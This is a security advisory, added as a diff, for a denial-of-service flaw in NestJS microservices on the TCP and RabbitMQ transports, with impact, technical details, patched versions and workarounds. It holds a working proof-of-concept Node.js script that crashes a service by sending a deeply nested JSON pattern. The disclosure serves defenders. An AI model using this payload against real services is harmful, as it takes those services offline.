@@ -1,0 +1,54 @@
+Summary
+A single message whose pattern is a deeply nested object terminates a NestJS microservice that uses the TCP or
+RabbitMQ transport. The server serialized the client-supplied pattern with JSON.stringify to derive the handler
+lookup key; on deeply nested input this throws RangeError: Maximum call stack size exceeded. The exception escaped
+the asynchronous message handler as an unhandled promise rejection, which terminates the Node.js process under the
+default --unhandled-rejections=throw.
+
+Impact
+Denial of service, one message per crash, repeatable. The attacker needs to be able to reach the transport: connect
+to the TCP transport's port, or publish to the queue or exchange the service consumes from. The TCP transport
+performs no authentication by default, so on a reachable port this requires nothing else.
+
+Only the TCP and RabbitMQ transports are affected. The other transports take the pattern as a string from the
+broker topic or channel and never serialize a client-supplied object to build it.
+
+Details
+In ServerTCP#handleMessage and ServerRMQ#handleMessage the pattern was stringified without a guard:
+
+const pattern = isString(packet.pattern)
+  ? packet.pattern
+  : JSON.stringify(packet.pattern);
+JSON.parse accepts nesting depths that JSON.stringify cannot re-serialize, because JSON.stringify recurses
+natively, so an attacker can craft a payload that parses successfully on arrival and then throws when the pattern is
+converted back to a string. Neither transport attached a rejection handler to the promise returned by
+handleMessage, so the RangeError propagated out as an unhandled rejection.
+
+Proof of concept
+Against a NestJS microservice on the TCP transport (default port 3001). The nested JSON is built as text rather than
+with JSON.stringify, which is what makes the payload serializable by the attacker but not by the victim:
+
+const { connect } = require('node:net');
+
+const DEPTH = 100_000;
+const pattern = '{"nested":'.repeat(DEPTH) + '{}' + '}'.repeat(DEPTH);
+const payload = `{"pattern":${pattern},"data":null,"id":"1"}`;
+
+const socket = connect(3001, '127.0.0.1', () => {
+  // Nest's TCP framing is <byteLength>#<json>
+  socket.write(`${Buffer.byteLength(payload)}#${payload}`);
+});
+The service exits with RangeError: Maximum call stack size exceeded. The equivalent payload published to the
+consumed queue crashes a RabbitMQ-transport service.
+
+Patches
+Fixed in 12.0.2 and 11.2.4.
+
+Incoming patterns are converted through a guarded Server#getPatternAsString, which falls back to a sentinel value
+that matches no handler. Such a message now receives the ordinary "no message handler" response (TCP) or is
+negatively acknowledged (RabbitMQ) instead of crashing the process.
+Rejections escaping handleMessage in both transports are routed to handleError rather than left unhandled.
+Workarounds
+If you cannot upgrade, restrict network access to the transport so that only trusted peers can reach it. Running the
+process with --unhandled-rejections=warn prevents the crash but leaves the message unprocessed and is not a
+substitute for the fix.
